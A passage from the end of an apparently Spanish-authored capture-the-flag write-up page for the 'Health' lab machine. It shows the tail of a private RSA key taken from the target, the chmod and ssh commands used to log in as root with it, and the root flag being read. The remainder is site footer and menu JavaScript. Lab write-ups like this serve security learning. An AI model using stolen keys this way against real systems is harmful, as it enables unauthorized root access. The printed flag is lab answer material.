C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl
hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8
efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2
1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj
nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3
sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou
fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q
0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ
zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT
rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB
N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD
SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o
++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp
UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a
vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU
6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm
QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G
-----END RSA PRIVATE KEY-----

<span class="na">❯ </span><span class="kt">chmod</span> 600 id_rsa

<span class="na">❯ </span><span class="kt">ssh</span> -i id_rsa root@10.10.11.176

<span class="kt">root@health</span>:~# cat root.txt 
ceadf881e3fe73ccfb6f7248ec438ea4
<span class="kt">root@health</span>:~# 
</span> </code></pre></div></div>

		</article>

<aside class="post-widget">
   <nav class="post-toc-wrap fixed" id="post-toc">
      <h4>Table of contents</h4>
      <ol class="post-toc">
      </ol>
   </nav>
</aside>


<a href="https://www.buymeacoffee.com/0xv01d" target="_blank" style="margin-top: 1rem;"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>

    </div>
<article id="wrap">
	<article id="lightings">
    	<section id="one">
            <section id="two">
                <section id="three">
                    <section id="four">
                        <section id="five">
                            
                        </section>
                    </section>
                </section>
            </section>
		</section>
    </article>
</article>

    <footer class="footer">
    <div class="bottom">
        <p><span>0xv01d © 2022 - 2024</span>
        </p>
    </div>
</footer> 
      </main>
      <div id="mask" class="mask"></div>
<a href="#" id="gotop" class="waves-effect waves-circle waves-light in"><span class="icon icon-lg icon-chevron-up"></span></a>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            var gotopButton = document.getElementById("gotop");

            // Show/hide the button based on scroll position
            window.addEventListener("scroll", function () {
                if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                    gotopButton.style.opacity = "1";
                } else {
                    gotopButton.style.opacity = "0";
                }
            });

            // Smooth scroll to top when the button is clicked
            gotopButton.addEventListener("click", function (event) {
                event.preventDefault();

                // Use the scrollIntoView method with behavior: 'smooth'
                document.body.scrollIntoView({ behavior: 'smooth', block: 'start' });
            });
        });

    </script>
    <script>
        function copyToClipboard(button) {
            // Find the nearest .highlight parent of the clicked button
            const codeElement = button.closest('.highlight');

            if (codeElement) {
                // Clone the code element to exclude the button
                const codeClone = codeElement.cloneNode(true);

                // Remove the button from the clone
                const buttons = codeClone.querySelectorAll('.copy-btn');
                buttons.forEach((btn) => btn.remove());

                const codeText = codeClone.innerText;

                // Create a temporary textarea element to copy the text
                const textarea = document.createElement('textarea');
                textarea.value = codeText;
                document.body.appendChild(textarea);

                // Select and copy the text
                textarea.select();
                document.execCommand('copy');

                // Remove the temporary textarea
                document.body.removeChild(textarea);

                // Change the icon in the button to "fa-check"
                const iconElement = button.querySelector('i');
                if (iconElement) {
                  iconElement.classList.remove('fa-clipboard');
                  iconElement.classList.add('fa-check', 'green-icon');
                }

                // Temporarily change the icon back to "fa-clipboard" after 2000 milliseconds (2 seconds)
                setTimeout(() => {
                  if (iconElement) {
                    iconElement.classList.remove('fa-check', 'green-icon');
                    iconElement.classList.add('fa-clipboard');
                  }
                }, 2000);
            } else {
                console.error('Unable to find the code element');
            }
        }
    </script>


    <script>
    document.getElementById('menu-toggle').addEventListener('click', function() {
        var menu = document.getElementById('menu');
        // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
        menu.classList.toggle('hide');
    });

    document.getElementById('menu-off').addEventListener('click', function() {
        var menu = document.getElementById('menu');
        // Agregar la clase 'hide' para ocultar el menú
        menu.classList.add('hide');
    });
</script>

<script>
    function lock() {
        var doc = document.getElementById('doc');
        var menu = document.getElementById('menu');
        var mask = document.getElementById('mask');
        var screenWidth = window.innerWidth;

        if (screenWidth <= 1240) {
            doc.classList.toggle('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
            menu.classList.remove('hide')
            menu.classList.toggle('show')
            mask.classList.add('in')
        } else {
            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
        }
    }

    function unlock() {
        var doc = document.getElementById('doc');
        var menu = document.getElementById('menu');
        var mask = document.getElementById('mask');
        var screenWidth = window.innerWidth;

        if (screenWidth <= 1240) {
            doc.classList.remove('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
            menu.classList.toggle('hide')
            menu.classList.remove('show')
            mask.classList.remove('in')
        } else {
            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
            menu.classList.add('hide')
            menu.classList.remove('show')
            mask.classList.remove('in')
        }
    }

    // Llamar a la función al cargar la página y cuando se redimensiona la ventana
//    window.addEventListener('load', lock);
//    window.addEventListener('resize', unlock);

    // Añadir el evento click al botón de menú
    document.getElementById('menu-toggle').addEventListener('click', function() {
        lock();  // Actualizar visibilidad del menú al hacer clic en el botón
    });

    // Añadir el evento click al botón de ocultar menú
    document.getElementById('menu-off').addEventListener('click', function() {
        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
    });
    
    document.getElementById('mask').addEventListener('click', function() {
        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
    });
</script>


  </body>
</div>
</html>
